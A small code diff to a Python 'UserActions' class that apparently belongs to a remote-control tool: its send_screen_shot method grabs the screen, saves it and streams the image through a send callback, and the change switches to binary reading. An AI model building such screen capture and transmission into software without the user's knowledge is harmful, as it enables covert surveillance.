@@ -121,14 +121,17 @@ class UserActions:
     @staticmethod
     def send_screen_shot(content, send):
         im = ImageGrab.grab()
-        # im.show()
+
         dirname = os.path.dirname(__file__)
         saving_path = os.path.join(dirname, './screenshot-{}.png'.format(time.time()))
-        # print saving_path
+
+        # Save Image
         im.save(saving_path)
-        img_file = open(saving_path,'r')
+
+        # Start sending the image
+        img_file = open(saving_path,'rb')
         while True:
-            strng = img_file.readline(512)
+            strng = img_file.read(512)
             if not strng:
                 break
             send(strng)
